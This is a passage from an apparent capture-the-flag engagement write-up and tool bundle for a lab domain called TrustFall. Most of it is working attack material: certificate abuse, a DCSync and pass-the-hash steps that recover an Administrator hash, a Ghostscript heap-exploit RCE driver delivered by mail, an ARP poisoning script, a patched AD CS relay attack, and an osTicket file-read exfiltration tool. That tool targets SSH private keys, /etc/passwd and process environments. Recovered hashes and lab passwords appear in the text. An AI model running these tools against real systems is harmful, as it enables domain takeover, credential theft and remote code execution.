- IIS runs the WSUS application pool as `NT AUTHORITY\NETWORK SERVICE`.
- On a domain member, Network Service authenticates to remote domain services with the computer account.
- On DC01, that network identity is `TRUSTFALL\DC01$`.
- The `KerberosAuthentication` template permits the DC computer to enroll and embeds its security SID.

Download the issued certificate through the existing WSUS tunnel and pair it with the local key:

```bash
curl -sS \
  http://127.0.0.1:18530/Content/tf-dc01-cert/dc01-issued.cer \
  -o loot/trustfall-dc01-cert/dc01-issued.cer

openssl x509 \
  -in loot/trustfall-dc01-cert/dc01-issued.cer \
  -noout -issuer -serial -dates -ext subjectAltName

openssl pkcs12 -export \
  -inkey loot/trustfall-dc01-cert/dc01.key \
  -in loot/trustfall-dc01-cert/dc01-issued.cer \
  -out loot/trustfall-dc01-cert/dc01.pfx \
  -passout pass:'TrustFall-DC01-2026!'
```

## 13. Authenticate as DC01$, DCSync Administrator, and read the admin flag

Run certificate authentication from ticket01 so Kerberos reaches the private DC directly:

```bash
scp -i "$KEY" loot/trustfall-dc01-cert/dc01.pfx \
  martin@"$TARGET":/tmp/dc01.pfx

ssh -i "$KEY" martin@"$TARGET" '
  cd /tmp
  /home/martin/trustfall-venv/bin/certipy auth \
    -pfx /tmp/dc01.pfx \
    -password '\''TrustFall-DC01-2026!'\'' \
    -dc-ip 192.168.1.32 \
    -username '\''DC01$'\'' \
    -domain trustfall.htb
'
```

Certipy maps the SID extension to `dc01$@trustfall.htb`, obtains a TGT, and retrieves the live machine-account NT hash. The observed value was:

```plaintext
DC01$:14be05b910409bffb3934b9e3e6019a1
```

Do not blindly assume the machine hash is constant after a reset; use the value printed by your own Certipy run.

A domain controller computer account has directory-replication rights. Use the recovered hash for a deliberately narrow DCSync of only the built-in Administrator:

```bash
ssh -i "$KEY" martin@"$TARGET" '
  /home/martin/trustfall-venv/bin/secretsdump.py \
    -hashes aad3b435b51404eeaad3b435b51404ee:14be05b910409bffb3934b9e3e6019a1 \
    -just-dc-user Administrator \
    '\''TRUSTFALL/DC01$@192.168.1.32'\''
'
```

The recovered Administrator NT hash was:

```plaintext
8c689a8c5f009842d838798a8e18c615
```

Use that hash through the existing DC01 WinRM tunnel:

```bash
NO_PROXY='*' /tmp/trustfall-psrp/bin/python \
  tools/psrp_hash_exec.py \
  --server 127.0.0.1 --port 15987 \
  --username 'TRUSTFALL\Administrator' \
  --hashes 'aad3b435b51404eeaad3b435b51404ee:8c689a8c5f009842d838798a8e18c615' \
  'whoami; Get-Content "C:\Users\Administrator\Desktop\root.txt"'
```

The recovered administrator/root flag was:

```plaintext
aa102651c39ef94abc6ea5a198aeb4ab
```


## tools/psrp_hash_exec.py

```python
#!/usr/bin/env python3
"""Execute PowerShell over PSRP/WinRM using an NTLM LM:NT hash."""

import argparse

from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", required=True)
    parser.add_argument("--port", type=int, default=5985)
    parser.add_argument("--username", required=True)
    parser.add_argument("--hashes", required=True)
    parser.add_argument("--configuration", default="Microsoft.PowerShell")
    parser.add_argument("script")
    args = parser.parse_args()

    connection = WSMan(
        args.server,
        port=args.port,
        ssl=False,
        auth="ntlm",
        username=args.username,
        password=args.hashes,
        encryption="auto",
        no_proxy=True,
    )
    with RunspacePool(connection, configuration_name=args.configuration) as pool:
        powershell = PowerShell(pool)
        powershell.add_script(args.script)
        output = powershell.invoke()
        for item in output:
            print(item)
        for stream_name in ("error", "warning", "verbose", "debug", "information"):
            for item in getattr(powershell.streams, stream_name, []):
                print(f"[{stream_name}] {item}")
        return 1 if powershell.had_errors else 0


if __name__ == "__main__":
    raise SystemExit(main())

```



## tools/trustfall_pipe_rce.py

```python
#!/usr/bin/env python3
"""Direct, retryable TrustFall Ghostscript path-control to %pipe% RCE PoC."""

from __future__ import annotations

import argparse
import concurrent.futures
import os
import re
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

import requests


WORKSPACE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(WORKSPACE / "tools"))
import trustfall_heap_rce as chain  # noqa: E402


def log(message: str) -> None:
    now = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{now}] {message}", flush=True)


def daemon_future(function, *args) -> concurrent.futures.Future:
    future: concurrent.futures.Future = concurrent.futures.Future()

    def worker() -> None:
        try:
            future.set_result(function(*args))
        except BaseException as error:
            future.set_exception(error)

    threading.Thread(target=worker, daemon=True).start()
    return future


def fresh_trigger(mail: chain.Roundcube, uid: str, token: str, timeout: int):
    fresh = requests.Session()
    fresh.trust_env = False
    for cookie in mail.session.cookies:
        options = {"path": cookie.path or "/"}
        if cookie.domain:
            options["domain"] = cookie.domain
        fresh.cookies.set(cookie.name, cookie.value, **options)
    return fresh.get(
        mail.base,
        params={
            "_task": "mail",
            "_action": "get",
            "_mbox": "INBOX",
            "_uid": uid,
            "_part": "2",
            "_thumb": "1",
            "_token": token,
        },
        headers={**mail.headers, "Connection": "close"},
        timeout=timeout,
    )


def find_gs(
    oracle: chain.FileRead,
    baseline: int,
    ceiling: int,
    expected_heap_size: int,
    output: Path,
) -> chain.GhostscriptProcess:
    first = max(1, baseline - 4, ceiling - 144)
    found: list[tuple[int, str, int]] = []
    for chunk_first in range(first, ceiling + 1, 48):
        chunk_last = min(ceiling, chunk_first + 47)
        found.extend(oracle.processes(chunk_first, chunk_last))
    candidates = sorted(
        {pid for pid, name, uid in found if name == "gs" and uid == 33},
        reverse=True,
    )
    log(f"Ghostscript candidates: {candidates}")
    for pid in candidates:
        maps = oracle.read(f"/proc/{pid}/maps")
        if not maps:
            continue
        (output / f"gs-{pid}.maps").write_bytes(maps)
        match = re.search(
            rb"^([0-9a-f]+)-([0-9a-f]+)\s+rw-p\s+\S+\s+\S+\s+\S+\s+\[heap\]$",
            maps,
            re.MULTILINE,
        )
        if not match:
            continue
        start, end = (int(match.group(index), 16) for index in (1, 2))
        log(f"PID {pid}: heap={start:#x}-{end:#x} size={end - start:#x}")
        if end - start == expected_heap_size:
            return chain.GhostscriptProcess(pid, start, end, maps)
    raise RuntimeError("no waiting www-data Ghostscript had the calibrated heap size")


def find_gs_combined(
    oracle: chain.FileRead,
    baseline: int,
    ceiling: int,
    expected_heap_size: int,
    output: Path,
) -> chain.GhostscriptProcess:
    first = max(1, baseline - 4, ceiling - 6)
    candidates = oracle.process_maps(first, ceiling)
    log(f"combined Ghostscript candidates: {[pid for pid, _maps in candidates]}")
    for pid, maps in sorted(candidates, reverse=True):
        (output / f"gs-{pid}.maps").write_bytes(maps)
        match = re.search(
            rb"^([0-9a-f]+)-([0-9a-f]+)\s+rw-p\s+\S+\s+\S+\s+\S+\s+\[heap\]$",
            maps,
            re.MULTILINE,
        )
        if not match:
            continue
        start, end = (int(match.group(index), 16) for index in (1, 2))
        log(f"PID {pid}: heap={start:#x}-{end:#x} size={end - start:#x}")
        if end - start == expected_heap_size:
            return chain.GhostscriptProcess(pid, start, end, maps)
    raise RuntimeError("combined process/maps read found no calibrated Ghostscript")


def parser() -> argparse.ArgumentParser:
    result = argparse.ArgumentParser(description=__doc__)
    result.add_argument("--ip", default="10.129.115.133")
    result.add_argument("--tag", default="-pipe0921")
    result.add_argument("--victim-delta", type=int, default=-33096)
    result.add_argument("--path-scan-offset", type=lambda value: int(value, 0), default=0x2000C)
    result.add_argument("--direct-active-offset", type=lambda value: int(value, 0), default=0x35BBC)
    result.add_argument("--expected-heap-size", type=lambda value: int(value, 0), default=0x41F000)
    result.add_argument("--mail-host", default="mailsrv.trustfall.htb")
    result.add_argument("--mail-user", default="salvador@trustfall.htb")
    result.add_argument("--mail-password", default="TrustFallHRSalvador1988!")
    result.add_argument("--ticket-host", default="ticket.trustfall.htb")
    result.add_argument("--portal-user", default="salvador@trustfall.htb")
    result.add_argument("--portal-password", default="TrustFallPortalSalvador2026!")
    result.add_argument("--roundcube-cookie", type=Path, default=Path("/tmp/rc.newtarget.cookie"))
    result.add_argument("--osticket-cookie", type=Path, default=Path("/tmp/ost.cidmap.133.cookie"))
    result.add_argument(
        "--payload-generator",
        type=Path,
        default=Path("/tmp/CVE-2026-22200/osticket_ticket_payload_gen.py"),
    )
    result.add_argument("--thumbnail-delay", type=float, default=3.0)
    result.add_argument("--gs-start-delay", type=float, default=0.5)
    result.add_argument("--verify-calibration", action="store_true")
    result.add_argument("--osticket-timeout", type=int, default=90)
    result.add_argument("--trigger-timeout", type=int, default=900)
    result.add_argument("--pointer-timeout", type=int, default=90)
    result.add_argument("--ticket-cooldown", type=float, default=2.0)
    result.add_argument("--capture-proc", action="store_true")
    result.add_argument("--output", type=Path, default=WORKSPACE / "loot" / "trustfall-pipe-rce")
    return result


def main() -> int:
    args = parser().parse_args()
    if not re.fullmatch(r"[-A-Za-z0-9._]+", args.tag):
        raise SystemExit("--tag must contain only letters, digits, dot, underscore, and dash")
    runtime = argparse.Namespace(**vars(args))
    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    output = args.output / run_id
    output.mkdir(parents=True, exist_ok=True)

    environment = os.environ.copy()
    environment["TRUSTFALL_POINTER_TAG"] = args.tag
    subprocess.run(
        [
            "bash",
            str(chain.BUILD),
            "liveopvpdirect",
            str(args.victim_delta),
            "0",
        ],
        cwd=WORKSPACE,
        env=environment,
        check=True,
    )
    payload = chain.PROBES / f"ghostscript-cidmap-opvp-forge-liveopvpdirect{args.tag}.eps"
    pointer1_path = f"/tmp/trustfall-opvp-pointer{args.tag}"
    pointer2_path = f"/tmp/trustfall-opvp-pointer2{args.tag}"
    forge_path = f"/tmp/trustfall-forge-index{args.tag}"
    scan_path = f"/tmp/trustfall-path-scan{args.tag}"
    marker_path = f"/tmp/trustfall-pipe-rce{args.tag}"

    oracle = chain.FileRead(runtime, output / "file-read")
    baseline_raw = oracle.read("/proc/sys/kernel/ns_last_pid")
    if not baseline_raw:
        raise RuntimeError("could not establish PID baseline")
    baseline = int(baseline_raw.strip())
    log(f"PID baseline={baseline}")

    exploit_mail = chain.Roundcube(runtime)
    uid, token = exploit_mail.send(payload, f"TrustFall direct pipe {run_id}")
    log(f"payload delivered as UID {uid}; opening a fresh blocking thumbnail connection")
    time.sleep(args.thumbnail_delay)
    render = daemon_future(fresh_trigger, exploit_mail, uid, token, args.trigger_timeout)
    time.sleep(args.gs_start_delay)

    ceiling_raw = oracle.read("/proc/sys/kernel/ns_last_pid")
    if not ceiling_raw:
        raise RuntimeError("could not establish PID ceiling")
    ceiling = int(ceiling_raw.strip())
    log(f"PID ceiling={ceiling}")
    gs = find_gs_combined(oracle, baseline, ceiling, args.expected_heap_size, output)

    if args.capture_proc:
        for proc_name in ("status", "attr/current", "limits", "cmdline"):
            try:
                data = oracle.read(f"/proc/{gs.pid}/{proc_name}")
            except Exception as error:
                log(f"could not capture /proc/{gs.pid}/{proc_name}: {error}")
                continue
            if data is not None:
                destination = output / ("proc-" + proc_name.replace("/", "-"))
                destination.write_bytes(data)
                if proc_name == "attr/current":
                    log(f"LSM profile: {data.decode(errors='replace').strip()}")
                elif proc_name == "status":
                    fields = re.findall(
                        rb"^(?:NoNewPrivs|Seccomp|Seccomp_filters):.*$", data, re.MULTILINE
                    )
                    log("process confinement: " + b"; ".join(fields).decode(errors="replace"))

    probe = chain.elf_probe_address(gs)
    writer1 = output / "pointer1.eps"
    words1 = chain.make_pointer_writer(writer1, probe, pointer1_path, "ELF pointer")
    log(f"pointer1 ELF={probe:#x} words={words1}")
    chain.Roundcube(runtime).send_and_trigger(
        writer1, f"TrustFall pointer1 {run_id}", timeout=args.pointer_timeout
    )

    if args.verify_calibration:
        calibration = None
        for _ in range(4):
            calibration = oracle.read(forge_path)
            if calibration and re.match(rb"-?\d+\s+\d+", calibration):
                break
            time.sleep(2)
        if not calibration:
            raise RuntimeError("live renderer did not publish its calibration")
        (output / "forge-index").write_bytes(calibration)
        log(f"calibration={calibration.decode(errors='replace').strip()}")
    else:
        time.sleep(0.5)
        log("pointer1 render returned; releasing pointer2 without an extra ticket read")

    scan_base = gs.heap_start + args.direct_active_offset
    writer2 = output / "pointer2.eps"
    words2 = chain.make_pointer_writer(
        writer2,
        scan_base,
        pointer2_path,
        "heap scan pointer",
        hold=False,
    )
    log(f"pointer2 scan_base={scan_base:#x} words={words2}")
    pointer2_mail = chain.Roundcube(runtime)
    pointer2_uid, pointer2_token = pointer2_mail.send(
        writer2, f"TrustFall pointer2 {run_id}"
    )
    log(
        f"pointer2 delivered as UID {pointer2_uid}; "
        "opening its writer asynchronously"
    )
    time.sleep(args.thumbnail_delay)
    pointer2_render = daemon_future(
        fresh_trigger,
        pointer2_mail,
        pointer2_uid,
        pointer2_token,
        args.trigger_timeout,
    )
    time.sleep(2)

    for check in range(1, 6):
        marker = oracle.read(marker_path)
        if marker is not None:
            (output / "rce-marker").write_bytes(marker)
            scan = oracle.read(scan_path)
            if scan is not None:
                (output / "path-scan").write_bytes(scan)
            log(f"RCE CONFIRMED: {marker.decode(errors='replace').strip()}")
            if scan is not None:
                log(f"path signature: {scan.decode(errors='replace').strip()}")
            return 0
        log(f"marker check {check}/5: absent")
        time.sleep(2)

    if render.done():
        try:
            response = render.result()
            log(f"renderer returned HTTP {response.status_code}, bytes={len(response.content)}")
        except Exception as error:
            log(f"renderer ended with {type(error).__name__}: {error}")
    scan = oracle.read(scan_path)
    log(f"path-scan diagnostic: {scan!r}")
    raise RuntimeError("remote marker was not created")


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        log("interrupted; the remote render may still be waiting on its current stage")
        raise SystemExit(130)
    except Exception as error:
        log(f"{type(error).__name__}: {error}")
        raise SystemExit(1)
```

## tools/arp_mitm_pair.py

```python
#!/usr/bin/env python3
"""Targeted, reversible ARP MITM for one IPv4 peer pair."""

import argparse
import signal
import socket
import struct
import time


def mac_bytes(value):
    return bytes.fromhex(value.replace(":", ""))


def arp_reply(sock, iface_mac, claimed_ip, target_ip, target_mac, ethernet_src=None):
    src = ethernet_src or iface_mac
    ethernet = target_mac + src + struct.pack("!H", 0x0806)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1,
        0x0800,
        6,
        4,
        2,
        src,
        socket.inet_aton(claimed_ip),
        target_mac,
        socket.inet_aton(target_ip),
    )
    sock.send(ethernet + arp)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", required=True)
    parser.add_argument("--a-ip", required=True)
    parser.add_argument("--a-mac", required=True)
    parser.add_argument("--b-ip", required=True)
    parser.add_argument("--b-mac", required=True)
    parser.add_argument("--interval", type=float, default=2.0)
    args = parser.parse_args()

    attacker = mac_bytes(open(f"/sys/class/net/{args.iface}/address").read().strip())
    a_mac = mac_bytes(args.a_mac)
    b_mac = mac_bytes(args.b_mac)
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    sock.bind((args.iface, 0))
    stopping = False

    def stop(_signum, _frame):
        nonlocal stopping
        stopping = True

    signal.signal(signal.SIGINT, stop)
    signal.signal(signal.SIGTERM, stop)
    print(f"poisoning {args.a_ip} <-> {args.b_ip} via {args.iface}", flush=True)
    try:
        while not stopping:
            arp_reply(sock, attacker, args.b_ip, args.a_ip, a_mac)
            arp_reply(sock, attacker, args.a_ip, args.b_ip, b_mac)
            time.sleep(args.interval)
    finally:
        for _ in range(5):
            arp_reply(sock, attacker, args.b_ip, args.a_ip, a_mac, b_mac)
            arp_reply(sock, attacker, args.a_ip, args.b_ip, b_mac, a_mac)
            time.sleep(0.2)
        print("restored peer ARP mappings", flush=True)


if __name__ == "__main__":
    main()
```

## tools/extract_osticket_files.py

```python

#!/usr/bin/env python3
"""Extract osTicket filesystem-backed attachments from a mysqldump."""

from __future__ import annotations

import argparse
import binascii
import re
from collections import defaultdict
from pathlib import Path


CHUNK_RE = re.compile(rb"\((\d+),(\d+),0x([0-9A-Fa-f]+)\)")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("dump", type=Path)
    parser.add_argument("output", type=Path)
    parser.add_argument("--ids", default="", help="comma-separated file IDs; default: all")
    args = parser.parse_args()

    wanted = {int(value) for value in args.ids.split(",") if value.strip()}
    chunks: dict[int, dict[int, bytes]] = defaultdict(dict)

    data = args.dump.read_bytes()
    for match in CHUNK_RE.finditer(data):
        file_id = int(match.group(1))
        if wanted and file_id not in wanted:
            continue
        chunk_id = int(match.group(2))
        chunks[file_id][chunk_id] = binascii.unhexlify(match.group(3))

    args.output.mkdir(parents=True, exist_ok=True)
    for file_id in sorted(chunks):
        ordered = chunks[file_id]
        expected = list(range(max(ordered) + 1))
        if sorted(ordered) != expected:
            raise SystemExit(f"file {file_id}: missing chunks; got {sorted(ordered)}")
        content = b"".join(ordered[index] for index in expected)
        suffix = ".png" if content.startswith(b"\x89PNG\r\n\x1a\n") else ".bin"
        path = args.output / f"ost_file_{file_id:02d}{suffix}"
        path.write_bytes(content)
        print(f"{file_id}\t{len(content)}\t{path}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```


## tools/http_put_server.py

```python

#!/usr/bin/env python3
"""Minimal single-directory HTTP PUT receiver for lab artifact transfer."""

import argparse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import unquote, urlparse


class PutHandler(BaseHTTPRequestHandler):
    output_dir: Path

    def do_PUT(self) -> None:
        name = Path(unquote(urlparse(self.path).path)).name
        if not name or name in {".", ".."}:
            self.send_error(400, "A filename is required")
            return
        try:
            length = int(self.headers["Content-Length"])
        except (KeyError, TypeError, ValueError):
            self.send_error(411, "Content-Length is required")
            return
        destination = self.output_dir / name
        remaining = length
        with destination.open("wb") as stream:
            while remaining:
                chunk = self.rfile.read(min(1024 * 1024, remaining))
                if not chunk:
                    break
                stream.write(chunk)
                remaining -= len(chunk)
        if remaining:
            destination.unlink(missing_ok=True)
            self.send_error(400, "Incomplete upload")
            return
        self.send_response(201)
        self.end_headers()
        self.wfile.write(b"stored\n")

    def log_message(self, format: str, *args: object) -> None:
        print(f"{self.client_address[0]} {format % args}", flush=True)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--bind", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=18002)
    parser.add_argument("--output-dir", type=Path, required=True)
    args = parser.parse_args()
    args.output_dir.mkdir(parents=True, exist_ok=True)
    PutHandler.output_dir = args.output_dir.resolve()
    ThreadingHTTPServer((args.bind, args.port), PutHandler).serve_forever()


if __name__ == "__main__":
    main()
```

## tools/impacket-patched/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py

```python

# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   AD CS relay attack
#
# Authors:
#   Ex Android Dev (@ExAndroidDev)
#   Tw1sm (@Tw1sm)

import re
import base64
import os
from OpenSSL import crypto
import urllib.parse

from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption
from cryptography.x509 import ExtensionNotFound, load_pem_x509_certificate
from cryptography.x509.oid import NameOID, ObjectIdentifier
from cryptography.hazmat.backends import default_backend



from impacket import LOG

# cache already attacked clients
ELEVATED = []


class ADCSAttack:
    UPN_OID = ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")

    def _run(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)

        if self.username in ELEVATED:
            LOG.info('Skipping user %s since attack was already performed' % self.username)
            return

        current_template = self.config.template
        if current_template is None:
            current_template = "Machine" if self.username.endswith("$") else "User"

        # Template name might be UTF-8
        original_template = current_template
        current_template = urllib.parse.quote(current_template)
        if current_template == original_template:
            LOG.info('Using template name: %s' % current_template)
        else:
            LOG.info('Using template name: %s (%s)' % (current_template, original_template))

        csr = self.generate_csr(key, self.username, self.config.altName)
        csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
        LOG.info("CSR generated!")

        certAttrib = self.generate_certattributes(current_template, self.config.altName)

        data = "Mode=newreq&CertRequest=%s&CertAttrib=%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, certAttrib)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data)
        }

        LOG.info("Getting certificate...")

        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        ELEVATED.append(self.username)
        response = self.client.getresponse()

        if response.status != 200:
            LOG.error("Error getting certificate! Make sure you have entered valid certificate template.")
            return

        content = response.read()
        found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', content.decode())
        if len(found) == 0:
            LOG.error("Error obtaining certificate!")
            return

        certificate_id = found[0]

        self.client.request("GET", "/certsrv/certnew.cer?ReqID=" + certificate_id)
        response = self.client.getresponse()

        LOG.info("GOT CERTIFICATE! ID %s" % certificate_id)
        certificate = response.read().decode()

        cert_obj = load_pem_x509_certificate(certificate.encode(), backend=default_backend())
        pfx_filename = self._sanitize_filename(self.username or self._extract_certificate_identity(cert_obj) or "certificate_{0}".format(certificate_id))
        certificate_store = self.generate_pfx(key.to_cryptography_key(), cert_obj)
        output_path = os.path.join(self.config.lootdir, "{}.pfx".format(pfx_filename))
        LOG.info("Writing PKCS#12 certificate to %s" % output_path)
        try:
            if not os.path.isdir(self.config.lootdir):
                os.mkdir(self.config.lootdir)
            with open(output_path, 'wb') as f:
                f.write(certificate_store)
            LOG.info("Certificate successfully written to file")
        except Exception as e:
            LOG.info("Unable to write certificate to file, printing B64 of certificate to console instead")
            LOG.info("Base64-encoded PKCS#12 certificate (%s): \n%s" % (pfx_filename, base64.b64encode(certificate_store).decode()))
            pass

        if self.config.altName:
            LOG.info("This certificate can also be used for user : {}".format(self.config.altName))

    @staticmethod
    def generate_csr(key, CN, altName, csr_type = crypto.FILETYPE_PEM):
        LOG.info("Generating CSR...")
        subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, CN or "relay")])
        builder = x509.CertificateSigningRequestBuilder().subject_name(subject)
        if altName:
            # DER UTF8String encoding expected by Microsoft's UPN otherName.
            encoded = altName.encode()
            der_utf8 = bytes((0x0C, len(encoded))) + encoded
            builder = builder.add_extension(
                x509.SubjectAlternativeName([
                    x509.OtherName(ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"), der_utf8)
                ]),
                critical=False,
            )
        req = builder.sign(key.to_cryptography_key(), hashes.SHA256())
        return req.public_bytes(Encoding.PEM)

    @staticmethod
    def generate_pfx(key, certificate):
        pfx_data = pkcs12.serialize_key_and_certificates(
            name=b"",
            key=key,
            cert=certificate,
            cas=None,
            encryption_algorithm=NoEncryption()
        )
        
        return pfx_data
    
    @staticmethod
    def generate_certattributes(template, altName):
        if altName:
            return "CertificateTemplate:{}%0d%0aSAN:upn={}".format(template, altName)
        return "CertificateTemplate:{}".format(template)

    @classmethod
    def _extract_certificate_identity(cls, cert):
        try:
            common_names = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)
            for attribute in common_names:
                value = attribute.value.strip()
                if value:
                    return value
        except Exception:
            pass

        try:
            san_extension = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
            san = san_extension.value
            for other_name in san.get_values_for_type(x509.OtherName):
                if other_name.type_id == cls.UPN_OID:
                    value = other_name.value
                    if isinstance(value, bytes):
                        value = value.decode('utf-8', errors='ignore')
                    value = value.strip()
                    if value:
                        return value
            for dns_name in san.get_values_for_type(x509.DNSName):
                value = dns_name.strip()
                if value:
                    return value
        except ExtensionNotFound:
            pass
        except Exception:
            pass

        return None

    @staticmethod
    def _sanitize_filename(name):
        sanitized = re.sub(r'[^A-Za-z0-9._-]', '_', name)
        sanitized = sanitized.strip("._")
        return sanitized
```

## tools/osticket_file_exfil.py

```python

#!/usr/bin/env python3
"""Collect known files through the osTicket 1.18.2 PDF file-read primitive."""

from __future__ import annotations

import argparse
import base64
import hashlib
import io
import json
import re
import subprocess
import sys
import zlib
from pathlib import Path

import fitz
import requests
from PIL import Image


DEFAULT_PATHS = [
    # Host identity and account policy
    "/etc/hostname",
    "/etc/hosts",
    "/etc/os-release",
    "/etc/passwd",
    "/etc/group",
    "/etc/shells",
    "/etc/nsswitch.conf",
    "/etc/resolv.conf",
    "/etc/fstab",
    "/etc/environment",
    "/etc/crontab",
    "/etc/login.defs",
    "/etc/security/pwquality.conf",
    # Network and remote access
    "/etc/ssh/sshd_config",
    "/etc/ssh/sshd_config.d/50-cloud-init.conf",
    "/etc/vsftpd.conf",
    "/etc/netplan/50-cloud-init.yaml",
    "/etc/netplan/00-installer-config.yaml",
    # Web and PHP
    "/etc/apache2/apache2.conf",
    "/etc/apache2/ports.conf",
    "/etc/apache2/envvars",
    "/etc/apache2/sites-enabled/000-default.conf",
    "/etc/apache2/sites-enabled/ticket.trustfall.htb.conf",
    "/etc/apache2/sites-enabled/mailsrv.trustfall.htb.conf",
    "/etc/php/8.3/apache2/php.ini",
    "/etc/php/8.3/cli/php.ini",
    "/var/www/osticket/upload/include/ost-config.php",
    "/var/www/mailsrv.trustfall.htb/config/config.inc.php",
    # Mail services
    "/etc/postfix/main.cf",
    "/etc/postfix/master.cf",
    "/etc/dovecot/dovecot.conf",
    "/etc/dovecot/users",
    "/etc/dovecot/passwd",
    "/etc/dovecot/conf.d/10-auth.conf",
    "/etc/dovecot/conf.d/10-mail.conf",
    "/etc/dovecot/conf.d/10-master.conf",
    "/etc/dovecot/conf.d/10-ssl.conf",
    "/etc/dovecot/conf.d/auth-sql.conf.ext",
    "/etc/dovecot/dovecot-sql.conf.ext",
    # Database configuration
    "/etc/mysql/my.cnf",
    "/etc/mysql/debian.cnf",
    "/etc/mysql/mariadb.conf.d/50-server.cnf",
    # Process and runtime discovery
    "/proc/self/cmdline",
    "/proc/self/environ",
    "/proc/self/status",
    "/proc/self/limits",
    "/proc/self/cgroup",
    "/proc/self/mountinfo",
    "/proc/net/route",
    "/proc/net/arp",
    "/proc/net/tcp",
    "/proc/net/tcp6",
    "/proc/net/udp",
    # Likely user and operational artifacts
    "/home/martin/.profile",
    "/home/martin/.bashrc",
    "/home/martin/.bash_history",
    "/home/martin/.ssh/authorized_keys",
    "/home/martin/.ssh/id_rsa",
    "/root/.ssh/authorized_keys",
    "/root/.ssh/id_rsa",
    "/var/www/.ssh/id_rsa",
    "/var/spool/cron/crontabs/root",
    "/var/spool/cron/crontabs/martin",
]


class Collector:
    def __init__(self, ip: str, host: str, cookie_jar: Path, generator: Path,
                 output: Path, batch_size: int, encoding: str):
        self.base = f"http://{ip}"
        self.host = host
        self.generator = generator
        self.output = output
        self.batch_size = batch_size
        self.encoding = encoding
        self.cookie_jar = cookie_jar
        self.session = requests.Session()
        self.session.trust_env = False
        self.cookie = self._load_cookie(cookie_jar)
        self.ticket_id: int | None = None
        self.ticket_count = 0
        self.payload_count = 0
        self.payload_hashes: set[bytes] = set()
        self.request_timeout = 180

    @staticmethod
    def _load_cookie(path: Path) -> str:
        for line in path.read_text().splitlines():
            if line.startswith("#HttpOnly_") or (line and not line.startswith("#")):
                fields = line.split("\t")
                if len(fields) >= 7 and fields[-2] == "OSTSESSID":
                    return fields[-1]
        raise RuntimeError(f"OSTSESSID not found in {path}")

    def request(self, method: str, path: str, **kwargs) -> requests.Response:
        headers = dict(kwargs.pop("headers", {}))
        headers["Host"] = self.host
        headers["Cookie"] = f"OSTSESSID={self.cookie}"
        response = self.session.request(
            method, self.base + path, headers=headers,
            timeout=kwargs.pop("timeout", self.request_timeout),
            allow_redirects=kwargs.pop("allow_redirects", False), **kwargs)
        cookies = response.raw.headers.getlist("Set-Cookie")
        for header in cookies:
            match = re.search(r"(?:^|[,;]\s*)OSTSESSID=([^;,]+)", header)
            if match:
                self.cookie = match.group(1)
        self.cookie_jar.write_text(
            "# Netscape HTTP Cookie File\n\n"
            f"#HttpOnly_.{self.host}\tTRUE\t/\tFALSE\t0\tOSTSESSID\t{self.cookie}\n"
        )
        return response

    @staticmethod
    def _csrf(html: str) -> str:
        match = re.search(r'name="__CSRFToken__" value="([^"]+)"', html)
        if not match:
            raise RuntimeError("CSRF token not found (session may have expired)")
        return match.group(1)

    def create_ticket(self) -> None:
        page = self.request("GET", "/open.php")
        if "salvador@trustfall.htb" not in page.text:
            raise RuntimeError("Salvador portal session is no longer authenticated")
        csrf = self._csrf(page.text)
        form = self.request(
            "GET", "/ajax.php/form/help-topic/1",
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "X-CSRFToken": csrf,
                "Referer": f"http://{self.host}/open.php",
            },
        )
        dynamic = form.json()["html"]
        subject = re.search(r'<input[^>]+name="([^"]+)"', dynamic)
        message = re.search(r'<textarea[^>]+name="([^"]+)"', dynamic)
        if not subject or not message:
            raise RuntimeError("Dynamic ticket fields were not found")
        fields = {
            "__CSRFToken__": (None, csrf),
            "a": (None, "open"),
            "topicId": (None, "1"),
            subject.group(1): (None, f"Configuration archive {self.ticket_count + 1}"),
            message.group(1): (None, "Validating service configuration."),
        }
        created = self.request(
            "POST", "/open.php", files=fields,
            headers={"Referer": f"http://{self.host}/open.php"},
        )
        location = created.headers.get("Location", "")
        match = re.search(r"tickets\.php\?id=(\d+)", location)
        if not match:
            raise RuntimeError(f"Ticket creation failed: HTTP {created.status_code}")
        self.ticket_id = int(match.group(1))
        self.ticket_count += 1
        self.payload_count = 0
        self.payload_hashes = set()
        print(f"[+] Created ticket id={self.ticket_id}", flush=True)

    def add_path(self, path: str) -> None:
